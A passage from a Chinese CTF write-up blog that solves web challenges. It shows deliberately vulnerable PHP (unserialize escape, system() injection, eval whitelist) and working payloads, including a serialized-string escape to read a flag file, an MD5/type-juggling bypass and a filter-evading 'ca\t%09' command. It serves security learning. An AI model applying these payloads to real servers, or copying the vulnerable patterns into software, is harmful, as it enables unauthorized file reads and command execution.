class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>提示phpinfo有货 部分信息 $php_version&#x3D;7.0.33 ,auto_append_file&#x3D;d0g3_f1ag.php </p><p>可以看到filter对序列化后的信息进行处理,属于反序列化字符串数变少的情况</p><p>构建测试样例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>    <span class="hljs-variable">$o</span>=serialize(<span class="hljs-variable">$_SESSION</span>);<br>    var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们希望img参数可控，这个时候需要让他逃逸出去</p><p>需要逃逸的字符串为 <code>;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; </code>  长度40 这里ZDBnM19mMWFnLnBocA&#x3D;&#x3D;是d0g3_f1ag.php取Base64的结果。</p><p>重新构建</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>  <span class="hljs-comment">//  $_SESSION[&#x27;img&#x27;] =&#x27;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;</span><br><br>    <span class="hljs-variable">$o</span>=serialize(<span class="hljs-variable">$_SESSION</span>);<br>    var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>希望是function这个字符串可以把后面的东西挤出去</p><p>然后看 guest 之后 和希望逃逸字符串之前的字符串内容 <code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> 因为他的filter函数 把 字长4 变成 字长0所以这里显然要让</p><p> <code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> 是4的倍数 即24</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br><span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br><span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>;  <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;&#x27;</span>;   <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><span class="hljs-variable">$o</span>=filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br>var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//&quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:40:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span><br>var_dump(unserialize(<span class="hljs-variable">$o</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是这个时候没有反序列化成功</p><p>于是加上 因为img被挤出去了，这个时候随便引入一个就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br><span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br><span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>;  <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;   <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><span class="hljs-variable">$o</span>=filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br>var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br>var_dump(unserialize(<span class="hljs-variable">$o</span>));<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//反序列化结果</span><br><span class="hljs-comment">/*array(3) &#123;</span><br><span class="hljs-comment">  &#x27;user&#x27; =&gt;</span><br><span class="hljs-comment">  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:58:&quot;1&quot;</span><br><span class="hljs-comment">  &#x27;img&#x27; =&gt;</span><br><span class="hljs-comment">  string(20) &quot;ZDBnM19mMWFnLnBocA==&quot;</span><br><span class="hljs-comment">  &#x27;a&#x27; =&gt;</span><br><span class="hljs-comment">  string(1) &quot;b&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span>: /<span class="hljs-keyword">index</span>.php?f=show_image<br><br>POST:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=<span class="hljs-number">1</span>&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;<br></code></pre></td></tr></table></figure><p>得到真flag文件名</p><p>最后base64编码真flag&#x2F;d0g3_fllllllag</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span>:/<span class="hljs-keyword">index</span>.php?f=show_image<br>POST:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=<span class="hljs-number">1</span>&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;<br></code></pre></td></tr></table></figure><p>getFlag</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>访问 robots.txt</p><p>发现 fAke_f1agggg.php ，假flag 然后在数据包里发现 Look_at_me:&#x2F;fl4g.php</p><p>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img src=<span class="hljs-string">&quot;/img.jpg&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==md5(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!strstr(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = str_ireplace(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;<br>        system(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;蹇埌闈炴床浜�&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鍘婚潪娲插惂&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>虽然乱码打死你hi不影响做题，很明显要运行到36行</p><p>less-1 :     fl4g.php?num&#x3D;2e10  这样保存结果是2 运行结果是2e10</p><p>less-2:     ctfshow以前遇到过  &#x2F;fl4g.php?num&#x3D;2e10&amp;md5&#x3D;0e215962017</p><p>不是下一个我就不理解了，也不是只有cat可以查案看文本但是他也没过滤别的命令不知道为啥只能cat</p><p>最终</p><p><code>fl4g.php?num=2e10&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>php动态函数特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addition</span> (<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>   <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>), <span class="hljs-string">&quot;\n&quot;</span>;<br> &#125;<br> <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;addition&quot;</span>;<br> <span class="hljs-variable">$result</span> (<span class="hljs-number">3</span>,<span class="hljs-number">6</span>);<br><span class="hljs-string">&quot;addition&quot;</span>(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假设 原始 payload<code> system(ls)</code> &#x3D;&gt;<code>$GET[a]($GET[b])&amp;a=system&amp;b=ls</code></p><p>中括号被ban payload 